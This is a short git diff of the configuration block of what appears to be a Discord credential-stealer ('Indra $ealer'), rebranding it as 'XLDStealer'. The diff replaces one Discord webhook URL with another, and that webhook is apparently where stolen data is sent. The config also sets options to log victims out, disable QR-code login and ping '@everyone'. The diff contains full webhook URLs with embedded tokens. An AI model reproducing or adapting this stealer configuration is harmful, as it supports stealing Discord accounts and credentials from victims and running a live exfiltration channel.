@@ -11,9 +11,9 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "Indra",
+    brand: "XLDStealer",
 
-    webhook: "https://discord.com/api/webhooks/1074585152421896212/L3pm7v6igBUiipHlk3O6NortON-hCy0hhfPDcVuHtbDBC2eDrITN5Wjlirq3s7Tn_qx_",
+    webhook: "https://discord.com/api/webhooks/1074642829277667419/8lDYeqP1gpsyqMK_9webypwtjQOfxAZSISnCp9n98k4EYHRImwXjLS5wvGEdUWHGcMqj",
 
     logout: true,
     disable_qr_code: true,
@@ -23,7 +23,7 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "Indra $ealer | t.me/OwnedByIndra",
+        username: "XLDStealer",
         footer: {
             text: `Indra $Ealer | t.me/OwnedByIndra`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
